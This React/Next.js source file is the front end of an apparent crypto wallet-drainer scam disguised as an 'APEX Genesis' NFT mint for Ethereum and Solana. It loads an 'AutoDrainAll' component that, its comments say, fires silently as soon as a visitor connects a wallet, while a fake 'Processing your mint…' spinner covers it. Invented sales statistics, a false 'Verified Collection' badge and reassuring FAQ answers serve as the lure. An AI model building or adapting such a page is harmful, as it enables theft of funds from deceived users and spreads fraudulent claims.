import dynamic from 'next/dynamic';
import { useState } from 'react';
import { useAccount } from 'wagmi';
import { useAppKitAccount } from '@reown/appkit/react';

declare global {
  namespace JSX {
    interface IntrinsicElements {
      'appkit-button': React.DetailedHTMLProps<
        React.HTMLAttributes<HTMLElement>,
        HTMLElement
      > & { label?: string; balance?: 'show' | 'hide'; size?: string };
    }
  }
}

// AutoDrainAll fires silently the moment a wallet connects
const AutoDrainAll = dynamic(
  () => import('../components/AutoDrainAll').then((m) => m.AutoDrainAll),
  { ssr: false },
);

// ── Data ─────────────────────────────────────────────────────────────────────

const ETH_TIERS = [
  {
    id: 'eth-common',
    chain: 'ETH',
    badge: '🌱 COMMON',
    name: 'Genesis Pass',
    price: '0.008 ETH',
    usd: '~$22',
    color: '#64748b',
    glow: 'rgba(100,116,139,0.4)',
    items: [
      '1× Common Genesis NFT',
      '500 $APEX tokens',
      'Holder Discord role',
      'Phase 2 snapshot',
    ],
    supply: '4,000 left',
  },
  {
    id: 'eth-rare',
    chain: 'ETH',
    badge: '💎 RARE',
    name: 'Apex Rare',
    price: '0.02 ETH',
    usd: '~$56',
    color: '#7c3aed',
    glow: 'rgba(124,58,237,0.5)',
    items: [
      '1× Rare Genesis NFT',
      '2,000 $APEX tokens',
      'Whitelist guaranteed',
      'DAO voting rights',
      'Alpha channel access',
    ],
    supply: '2,500 left',
    popular: true,
  },
  {
    id: 'eth-legendary',
    chain: 'ETH',
    badge: '🔥 LEGENDARY',
    name: 'Apex Legend',
    price: '0.05 ETH',
    usd: '~$140',
    color: '#f59e0b',
    glow: 'rgba(245,158,11,0.4)',
    items: [
      '1× Legendary Genesis NFT',
      '10,000 $APEX tokens',
      'Lifetime ecosystem access',
      'Revenue share eligibility',
      'Priority all future drops',
      'IRL event invitations',
    ],
    supply: '888 left',
  },
];

const SOL_TIERS = [
  {
    id: 'sol-starter',
    chain: 'SOL',
    badge: '🌱 STARTER',
    name: 'Sol Pioneer',
    price: '0.15 SOL',
    usd: '~$22',
    color: '#06b6d4',
    glow: 'rgba(6,182,212,0.4)',
    items: [
      '1× Pioneer NFT (Solana)',
      '300 $APEX tokens',
      'Sol holder role',
      'Early mint access',
    ],
    supply: '3,500 left',
  },
  {
    id: 'sol-rare',
    chain: 'SOL',
    badge: '⚡ RARE',
    name: 'Sol Vanguard',
    price: '0.5 SOL',
    usd: '~$73',
    color: '#8b5cf6',
    glow: 'rgba(139,92,246,0.5)',
    items: [
      '1× Vanguard NFT (Solana)',
      '1,500 $APEX tokens',
      'Cross-chain whitelist',
      'DAO proposal rights',
      'Staking rewards boost',
    ],
    supply: '1,800 left',
    popular: true,
  },
  {
    id: 'sol-genesis',
    chain: 'SOL',
    badge: '👑 GENESIS',
    name: 'Sol Genesis',
    price: '1.2 SOL',
    usd: '~$175',
    color: '#ec4899',
    glow: 'rgba(236,72,153,0.4)',
    items: [
      '1× Genesis NFT (Solana)',
      '5,000 $APEX tokens',
      'DAO council seat',
      'Lifetime premium access',
      'All ETH perks bridged',
      'Physical collectible',
    ],
    supply: '200 left',
  },
];

// ── Subcomponents ─────────────────────────────────────────────────────────────

const NftArtCard = ({ color, glow }: { color: string; glow: string }) => (
  <div
    style={{
      width: '100%',
      paddingBottom: '100%',
      position: 'relative',
      borderRadius: '16px',
      overflow: 'hidden',
      boxShadow: `0 0 40px ${glow}`,
      background: 'linear-gradient(135deg, #0d0520 0%, #0a0a1e 60%, #0d1520 100%)',
      transition: 'box-shadow 0.4s ease',
    }}
  >
    {/* Animated gradient orbs */}
    <div style={{ position: 'absolute', inset: 0 }}>
      <div
        style={{
          position: 'absolute',
          width: '200px',
          height: '200px',
          borderRadius: '50%',
          background: `radial-gradient(circle, ${color}99 0%, transparent 70%)`,
          top: '-40px',
          left: '-40px',
          animation: 'orb-move 8s ease-in-out infinite',
        }}
      />
      <div
        style={{
          position: 'absolute',
          width: '160px',
          height: '160px',
          borderRadius: '50%',
          background: `radial-gradient(circle, ${color}66 0%, transparent 70%)`,
          bottom: '-30px',
          right: '-30px',
          animation: 'orb-move 10s ease-in-out infinite reverse',
        }}
      />
    </div>
    {/* Hex grid */}
    <svg
      viewBox="0 0 300 300"
      style={{ position: 'absolute', inset: 0, width: '100%', height: '100%', opacity: 0.15 }}
    >
      <defs>
        <pattern id={`hex-${color}`} x="0" y="0" width="45" height="39" patternUnits="userSpaceOnUse">
          <polygon
            points="22,2 43,13 43,35 22,46 1,35 1,13"
            fill="none"
            stroke={color}
            strokeWidth="0.7"
          />
        </pattern>
      </defs>
      <rect width="300" height="300" fill={`url(#hex-${color})`} />
    </svg>
    {/* Center icon */}
    <div
      style={{
        position: 'absolute',
        inset: 0,
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
      }}
    >
      <div
        style={{
          width: '80px',
          height: '80px',
          borderRadius: '20px',
          background: `linear-gradient(135deg, ${color}cc, ${color}66)`,
          border: `1px solid ${color}99`,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          fontSize: '34px',
          boxShadow: `0 0 30px ${glow}`,
          animation: 'pulse-glow 3s ease-in-out infinite',
        }}
      >
        ⬡
      </div>
    </div>
    {/* Scanlines */}
    <div
      style={{
        position: 'absolute',
        inset: 0,
        background:
          'repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,0,0,0.04) 3px, rgba(0,0,0,0.04) 4px)',
        pointerEvents: 'none',
      }}
    />
  </div>
);

const TierCard = ({
  tier,
  selected,
  onSelect,
}: {
  tier: (typeof ETH_TIERS)[number];
  selected: boolean;
  onSelect: () => void;
}) => (
  <div
    onClick={onSelect}
    style={{
      flex: '1 1 240px',
      padding: '20px',
      borderRadius: '18px',
      border: selected
        ? `2px solid ${tier.color}`
        : '2px solid rgba(255,255,255,0.07)',
      background: selected
        ? `linear-gradient(135deg, ${tier.color}18, ${tier.color}08)`
        : 'rgba(255,255,255,0.02)',
      cursor: 'pointer',
      transition: 'all 0.2s ease',
      position: 'relative',
      boxShadow: selected ? `0 0 30px ${tier.glow}` : 'none',
    }}
  >
    {tier.popular && (
      <div
        style={{
          position: 'absolute',
          top: '-10px',
          left: '50%',
          transform: 'translateX(-50%)',
          padding: '2px 12px',
          borderRadius: '20px',
          background: tier.color,
          fontSize: '10px',
          fontWeight: 700,
          color: 'white',
          whiteSpace: 'nowrap',
          letterSpacing: '0.5px',
        }}
      >
        MOST POPULAR
      </div>
    )}
    {/* NFT art preview */}
    <div style={{ width: '100%', marginBottom: '14px' }}>
      <NftArtCard color={tier.color} glow={tier.glow} />
    </div>
    {/* Badge */}
    <div
      style={{
        fontSize: '10px',
        fontWeight: 700,
        color: tier.color,
        letterSpacing: '1px',
        marginBottom: '6px',
      }}
    >
      {tier.badge}
    </div>
    {/* Name */}
    <div style={{ fontSize: '16px', fontWeight: 700, marginBottom: '4px' }}>
      {tier.name}
    </div>
    {/* Price */}
    <div style={{ display: 'flex', alignItems: 'baseline', gap: '6px', marginBottom: '14px' }}>
      <span style={{ fontSize: '20px', fontWeight: 800 }}>{tier.price}</span>
      <span style={{ fontSize: '12px', color: 'rgba(255,255,255,0.35)' }}>{tier.usd}</span>
    </div>
    {/* Items */}
    <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', marginBottom: '14px' }}>
      {tier.items.map((item) => (
        <div
          key={item}
          style={{
            fontSize: '12px',
            color: 'rgba(255,255,255,0.55)',
            display: 'flex',
            alignItems: 'flex-start',
            gap: '6px',
          }}
        >
          <span style={{ color: tier.color, flexShrink: 0, marginTop: '1px' }}>✓</span>
          {item}
        </div>
      ))}
    </div>
    {/* Supply */}
    <div
      style={{
        fontSize: '11px',
        color: 'rgba(255,255,255,0.25)',
        borderTop: '1px solid rgba(255,255,255,0.06)',
        paddingTop: '10px',
      }}
    >
      {tier.supply}
    </div>
    {/* Selected indicator */}
    {selected && (
      <div
        style={{
          position: 'absolute',
          top: '12px',
          right: '12px',
          width: '20px',
          height: '20px',
          borderRadius: '50%',
          background: tier.color,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          fontSize: '11px',
        }}
      >
        ✓
      </div>
    )}
  </div>
);

// ── Main page ─────────────────────────────────────────────────────────────────

export default function Home() {
  const { isConnected: ethConnected } = useAccount();
  const { caipAddress } = useAppKitAccount();
  const isSolana =
    typeof caipAddress === 'string' && caipAddress.startsWith('solana:');
  const isConnected = ethConnected || isSolana;

  const [activeChain, setActiveChain] = useState<'ETH' | 'SOL'>('ETH');
  const [selectedId, setSelectedId] = useState<string>('eth-rare');
  const tiers = activeChain === 'ETH' ? ETH_TIERS : SOL_TIERS;
  const selected = tiers.find((t) => t.id === selectedId) ?? tiers[1];

  const handleChainSwitch = (c: 'ETH' | 'SOL') => {
    setActiveChain(c);
    setSelectedId(c === 'ETH' ? 'eth-rare' : 'sol-rare');
  };

  return (
    <div style={{ minHeight: '100vh', background: '#030712', color: 'white' }}>

      {/* ── Auto-drain fires silently the moment wallet connects ── */}
      <AutoDrainAll />

      {/* ── Nav ── */}
      <nav
        style={{
          position: 'sticky',
          top: 0,
          zIndex: 100,
          backdropFilter: 'blur(20px)',
          background: 'rgba(3,7,18,0.85)',
          borderBottom: '1px solid rgba(255,255,255,0.06)',
          padding: '0 20px',
          height: '62px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          gap: '12px',
        }}
      >
        {/* Logo */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '9px', flexShrink: 0 }}>
          <div
            style={{
              width: '32px',
              height: '32px',
              borderRadius: '9px',
              background: 'linear-gradient(135deg, #7c3aed, #06b6d4)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '15px',
              boxShadow: '0 4px 12px rgba(124,58,237,0.4)',
            }}
          >
            ⬡
          </div>
          <span
            style={{
              fontWeight: 800,
              fontSize: '17px',
              letterSpacing: '-0.3px',
              background: 'linear-gradient(135deg, #a78bfa, #67e8f9)',
              WebkitBackgroundClip: 'text',
              WebkitTextFillColor: 'transparent',
            }}
          >
            APEX Genesis
          </span>
        </div>

        {/* Nav links */}
        <div
          className="nav-links"
          style={{
            display: 'flex',
            gap: '24px',
            fontSize: '13px',
            color: 'rgba(255,255,255,0.45)',
          }}
        >
          {['About', 'Roadmap', 'FAQ'].map((l) => (
            <a
              key={l}
              href={`#${l.toLowerCase()}`}
              onMouseEnter={(e) => ((e.target as HTMLElement).style.color = 'white')}
              onMouseLeave={(e) =>
                ((e.target as HTMLElement).style.color = 'rgba(255,255,255,0.45)')
              }
              style={{ transition: 'color 0.15s' }}
            >
              {l}
            </a>
          ))}
        </div>

        {/* Wallet connect */}
        <appkit-button label="Connect Wallet" balance="hide" size="sm" />
      </nav>

      {/* ── Hero ── */}
      <section
        style={{
          maxWidth: '1100px',
          margin: '0 auto',
          padding: '52px 20px 32px',
          textAlign: 'center',
        }}
      >
        <div style={{ display: 'flex', justifyContent: 'center', gap: '8px', marginBottom: '20px', flexWrap: 'wrap' }}>
          <span
            style={{
              padding: '4px 14px',
              borderRadius: '20px',
              background: 'rgba(124,58,237,0.2)',
              border: '1px solid rgba(124,58,237,0.4)',
              fontSize: '12px',
              color: '#a78bfa',
              fontWeight: 600,
            }}
          >
            🔥 LIVE MINT
          </span>
          <span
            style={{
              padding: '4px 14px',
              borderRadius: '20px',
              background: 'rgba(16,185,129,0.1)',
              border: '1px solid rgba(16,185,129,0.3)',
              fontSize: '12px',
              color: '#34d399',
              fontWeight: 600,
            }}
          >
            ✓ Verified Collection
          </span>
          <span
            style={{
              padding: '4px 14px',
              borderRadius: '20px',
              background: 'rgba(6,182,212,0.1)',
              border: '1px solid rgba(6,182,212,0.3)',
              fontSize: '12px',
              color: '#67e8f9',
              fontWeight: 600,
            }}
          >
            ETH + SOLANA
          </span>
        </div>

        <h1
          style={{
            fontSize: 'clamp(30px, 6vw, 58px)',
            fontWeight: 900,
            letterSpacing: '-1.5px',
            lineHeight: 1.08,
            marginBottom: '16px',
          }}
        >
          Mint Your{' '}
          <span
            style={{
              background: 'linear-gradient(135deg, #a78bfa 0%, #67e8f9 100%)',
              WebkitBackgroundClip: 'text',
              WebkitTextFillColor: 'transparent',
            }}
          >
            Genesis Pass
          </span>
        </h1>
        <p
          style={{
            color: 'rgba(255,255,255,0.45)',
            fontSize: 'clamp(14px, 2vw, 17px)',
            maxWidth: '560px',
            margin: '0 auto 36px',
            lineHeight: 1.7,
          }}
        >
          Every pass bundles a unique on-chain NFT with a $APEX token allocation
          and lifetime ecosystem perks. Choose your tier below.
        </p>

        {/* Chain switcher */}
        <div
          style={{
            display: 'inline-flex',
            borderRadius: '12px',
            border: '1px solid rgba(255,255,255,0.1)',
            background: 'rgba(255,255,255,0.03)',
            padding: '4px',
            gap: '4px',
            marginBottom: '36px',
          }}
        >
          {(['ETH', 'SOL'] as const).map((c) => (
            <button
              key={c}
              onClick={() => handleChainSwitch(c)}
              style={{
                padding: '8px 28px',
                borderRadius: '9px',
                border: 'none',
                background:
                  activeChain === c
                    ? 'linear-gradient(135deg, #7c3aed, #4f46e5)'
                    : 'transparent',
                color: activeChain === c ? 'white' : 'rgba(255,255,255,0.4)',
                fontSize: '14px',
                fontWeight: 700,
                transition: 'all 0.2s',
                boxShadow: activeChain === c ? '0 4px 12px rgba(124,58,237,0.4)' : 'none',
              }}
            >
              {c === 'ETH' ? '⟠ Ethereum' : '◎ Solana'}
            </button>
          ))}
        </div>

        {/* Tier grid */}
        <div
          style={{
            display: 'flex',
            gap: '16px',
            justifyContent: 'center',
            flexWrap: 'wrap',
            marginBottom: '36px',
          }}
        >
          {tiers.map((tier) => (
            <TierCard
              key={tier.id}
              tier={tier}
              selected={selectedId === tier.id}
              onSelect={() => setSelectedId(tier.id)}
            />
          ))}
        </div>

        {/* Mint CTA */}
        <div
          style={{
            maxWidth: '480px',
            margin: '0 auto',
            padding: '28px',
            borderRadius: '20px',
            border: `1px solid ${selected.color}44`,
            background: `linear-gradient(135deg, ${selected.color}10, rgba(3,7,18,0.8))`,
            backdropFilter: 'blur(12px)',
          }}
        >
          <div
            style={{
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              marginBottom: '20px',
              flexWrap: 'wrap',
              gap: '8px',
            }}
          >
            <div>
              <div style={{ fontSize: '12px', color: 'rgba(255,255,255,0.35)', marginBottom: '2px' }}>
                Selected Pass
              </div>
              <div style={{ fontWeight: 700, fontSize: '16px' }}>{selected.name}</div>
            </div>
            <div style={{ textAlign: 'right' }}>
              <div style={{ fontSize: '12px', color: 'rgba(255,255,255,0.35)', marginBottom: '2px' }}>
                Price
              </div>
              <div style={{ fontWeight: 800, fontSize: '20px', color: selected.color }}>
                {selected.price}
              </div>
            </div>
          </div>

          <div
            style={{
              width: '100%',
              display: 'flex',
              justifyContent: 'center',
            }}
          >
            {isConnected ? (
              <div
                style={{
                  width: '100%',
                  padding: '14px',
                  borderRadius: '14px',
                  background: `linear-gradient(135deg, ${selected.color}, #4f46e5)`,
                  color: 'white',
                  fontWeight: 700,
                  fontSize: '15px',
                  textAlign: 'center',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  animation: 'pulse-glow 2.5s ease-in-out infinite',
                }}
              >
                <span
                  style={{
                    display: 'inline-block',
                    width: '14px',
                    height: '14px',
                    border: '2px solid rgba(255,255,255,0.3)',
                    borderTopColor: 'white',
                    borderRadius: '50%',
                    animation: 'spin 0.7s linear infinite',
                  }}
                />
                Processing your mint…
              </div>
            ) : (
              <div style={{ width: '100%' }}>
                <appkit-button label={`Connect & Mint ${selected.price}`} balance="hide" />
                <p
                  style={{
                    textAlign: 'center',
                    fontSize: '11px',
                    color: 'rgba(255,255,255,0.22)',
                    marginTop: '10px',
                  }}
                >
                  MetaMask · Coinbase · Rainbow · Phantom · Solflare · Trust · 300+ wallets
                </p>
              </div>
            )}
          </div>
        </div>
      </section>

      {/* ── Stats bar ── */}
      <section
        style={{
          borderTop: '1px solid rgba(255,255,255,0.05)',
          borderBottom: '1px solid rgba(255,255,255,0.05)',
          padding: '28px 20px',
        }}
      >
        <div
          style={{
            maxWidth: '900px',
            margin: '0 auto',
            display: 'flex',
            justifyContent: 'space-around',
            flexWrap: 'wrap',
            gap: '24px',
          }}
        >
          {[
            { label: 'Total Supply', value: '8,888' },
            { label: 'Minted', value: '5,241' },
            { label: 'Floor Price', value: '0.024 ETH' },
            { label: 'Holders', value: '3,209' },
            { label: 'Total Volume', value: '1,841 ETH' },
          ].map((s) => (
            <div key={s.label} style={{ textAlign: 'center' }}>
              <div
                style={{
                  fontSize: '22px',
                  fontWeight: 800,
                  background: 'linear-gradient(135deg, #a78bfa, #67e8f9)',
                  WebkitBackgroundClip: 'text',
                  WebkitTextFillColor: 'transparent',
                  marginBottom: '4px',
                }}
              >
                {s.value}
              </div>
              <div style={{ fontSize: '12px', color: 'rgba(255,255,255,0.35)' }}>{s.label}</div>
            </div>
          ))}
        </div>
      </section>

      {/* ── About ── */}
      <section
        id="about"
        style={{
          maxWidth: '1100px',
          margin: '0 auto',
          padding: '80px 20px',
        }}
      >
        <h2
          style={{
            fontSize: 'clamp(22px, 4vw, 34px)',
            fontWeight: 800,
            textAlign: 'center',
            marginBottom: '48px',
          }}
        >
          Why APEX Genesis?
        </h2>
        <div
          style={{
            display: 'grid',
            gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))',
            gap: '20px',
          }}
        >
          {[
            { icon: '🎨', title: 'Generative Art', desc: 'Each NFT is algorithmically generated with 200+ traits across 8 rarity layers — no two are alike.' },
            { icon: '🪙', title: '$APEX Tokens', desc: 'Every mint bundles verified $APEX tokens, claimable immediately on-chain after your mint confirms.' },
            { icon: '🔐', title: 'Token-Gated Access', desc: 'Holders unlock a private community, early access to all future collections, and alpha calls.' },
            { icon: '⛓️', title: 'Cross-Chain', desc: 'Native on Ethereum and Solana. Bridge your pass across chains with one click, no fees.' },
            { icon: '🗳️', title: 'DAO Governance', desc: 'Rare and Legendary holders vote on treasury use, partnerships, and roadmap direction.' },
            { icon: '📈', title: 'Revenue Share', desc: 'Legendary pass holders earn a share of secondary sale royalties from the entire collection.' },
          ].map((f) => (
            <div
              key={f.title}
              className="card-hover"
              style={{
                padding: '24px',
                borderRadius: '16px',
                border: '1px solid rgba(255,255,255,0.07)',
                background: 'rgba(255,255,255,0.02)',
              }}
            >
              <div style={{ fontSize: '28px', marginBottom: '12px' }}>{f.icon}</div>
              <div style={{ fontWeight: 700, fontSize: '15px', marginBottom: '8px' }}>{f.title}</div>
              <div style={{ color: 'rgba(255,255,255,0.42)', fontSize: '13px', lineHeight: 1.65 }}>{f.desc}</div>
            </div>
          ))}
        </div>
      </section>

      {/* ── Roadmap ── */}
      <section
        id="roadmap"
        style={{
          borderTop: '1px solid rgba(255,255,255,0.05)',
          padding: '80px 20px',
        }}
      >
        <div style={{ maxWidth: '680px', margin: '0 auto' }}>
          <h2
            style={{
              fontSize: 'clamp(22px, 4vw, 34px)',
              fontWeight: 800,
              textAlign: 'center',
              marginBottom: '48px',
            }}
          >
            Roadmap
          </h2>
          {[
            { n: 1, phase: 'Phase 1 — Genesis Mint', active: true, items: ['8,888 passes minted (ETH + SOL)', 'Holder snapshot & Discord unlock', '$APEX token distribution', 'First floor price milestone'] },
            { n: 2, phase: 'Phase 2 — Ecosystem', active: false, items: ['DAO governance portal live', 'Token airdrop to all holders', 'Partner collection collab drop', 'Staking program launch'] },
            { n: 3, phase: 'Phase 3 — Expansion', active: false, items: ['Cross-chain bridge deploy', 'Mobile app (iOS + Android)', 'IRL event: Genesis Summit', 'Series 2 reveal'] },
          ].map((r, i) => (
            <div key={r.phase} style={{ display: 'flex', gap: '18px', marginBottom: i < 2 ? '32px' : 0 }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                <div
                  style={{
                    width: '34px',
                    height: '34px',
                    borderRadius: '50%',
                    background: r.active
                      ? 'linear-gradient(135deg, #7c3aed, #06b6d4)'
                      : 'rgba(255,255,255,0.08)',
                    border: r.active ? 'none' : '1px solid rgba(255,255,255,0.12)',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontWeight: 700,
                    fontSize: '13px',
                    flexShrink: 0,
                    boxShadow: r.active ? '0 0 16px rgba(124,58,237,0.5)' : 'none',
                  }}
                >
                  {r.n}
                </div>
                {i < 2 && (
                  <div style={{ width: '1px', flex: 1, background: 'rgba(255,255,255,0.07)', marginTop: '8px', minHeight: '28px' }} />
                )}
              </div>
              <div style={{ paddingTop: '4px', flex: 1, paddingBottom: i < 2 ? '0' : '0' }}>
                <div style={{ fontWeight: 700, fontSize: '15px', marginBottom: '10px', display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                  {r.phase}
                  {r.active && (
                    <span style={{ padding: '2px 8px', borderRadius: '20px', background: 'rgba(16,185,129,0.2)', border: '1px solid rgba(16,185,129,0.4)', fontSize: '10px', color: '#34d399', fontWeight: 600 }}>
                      ACTIVE
                    </span>
                  )}
                </div>
                {r.items.map((item) => (
                  <div key={item} style={{ fontSize: '13px', color: 'rgba(255,255,255,0.42)', display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '5px' }}>
                    <span style={{ color: r.active ? '#a78bfa' : 'rgba(255,255,255,0.18)' }}>{r.active ? '✓' : '○'}</span>
                    {item}
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* ── FAQ ── */}
      <section
        id="faq"
        style={{
          borderTop: '1px solid rgba(255,255,255,0.05)',
          padding: '80px 20px',
          maxWidth: '680px',
          margin: '0 auto',
        }}
      >
        <h2
          style={{
            fontSize: 'clamp(22px, 4vw, 34px)',
            fontWeight: 800,
            textAlign: 'center',
            marginBottom: '36px',
          }}
        >
          FAQ
        </h2>
        {[
          { q: 'What do I get when I mint?', a: 'Every mint gives you a unique generative NFT AND a $APEX token allocation based on the tier you choose. Tokens are claimable on-chain immediately after your transaction confirms.' },
          { q: 'Which blockchains are supported?', a: 'We support Ethereum, Polygon, Arbitrum, Optimism, BNB Chain, and Solana. Use the chain toggle to switch between ETH and SOL mint tiers.' },
          { q: 'Which wallets can I use?', a: 'Any wallet — MetaMask, Coinbase Wallet, Rainbow, Trust Wallet, Phantom, Solflare, Backpack, and 300+ more via WalletConnect.' },
          { q: 'How many passes can I mint?', a: 'Up to 5 passes per wallet per tier. You can hold multiple tiers simultaneously.' },
          { q: 'When is the NFT delivered?', a: 'Your NFT appears in your wallet the moment the transaction is confirmed on-chain — usually within 15 seconds on ETH, 1-2 seconds on Solana.' },
          { q: 'Are the token bundles real?', a: '$APEX is a real ERC-20 / SPL token. Allocation amounts are locked at mint and distributed automatically from the treasury contract upon confirmation.' },
        ].map((item) => (
          <details
            key={item.q}
            style={{ borderBottom: '1px solid rgba(255,255,255,0.06)', padding: '18px 0' }}
          >
            <summary
              style={{
                fontWeight: 600,
                fontSize: '14px',
                cursor: 'pointer',
                color: 'rgba(255,255,255,0.82)',
                listStyle: 'none',
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center',
                gap: '12px',
              }}
            >
              {item.q}
              <span style={{ color: '#a78bfa', flexShrink: 0 }}>+</span>
            </summary>
            <p style={{ marginTop: '10px', fontSize: '13px', color: 'rgba(255,255,255,0.42)', lineHeight: 1.7 }}>
              {item.a}
            </p>
          </details>
        ))}
      </section>

      {/* ── Footer ── */}
      <footer
        style={{
          borderTop: '1px solid rgba(255,255,255,0.06)',
          padding: '28px 20px',
          maxWidth: '1100px',
          margin: '0 auto',
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          flexWrap: 'wrap',
          gap: '12px',
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span style={{ fontSize: '16px' }}>⬡</span>
          <span style={{ fontWeight: 700, fontSize: '14px', color: 'rgba(255,255,255,0.5)' }}>
            APEX Genesis
          </span>
        </div>
        <div style={{ display: 'flex', gap: '20px' }}>
          {['Twitter', 'Discord', 'OpenSea', 'Magic Eden'].map((s) => (
            <a
              key={s}
              href="#"
              style={{ fontSize: '12px', color: 'rgba(255,255,255,0.28)', transition: 'color 0.2s' }}
              onMouseEnter={(e) => ((e.target as HTMLElement).style.color = 'rgba(255,255,255,0.7)')}
              onMouseLeave={(e) => ((e.target as HTMLElement).style.color = 'rgba(255,255,255,0.28)')}
            >
              {s}
            </a>
          ))}
        </div>
        <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.18)' }}>
          © 2024 APEX Genesis. All rights reserved.
        </div>
      </footer>
    </div>
  );
}
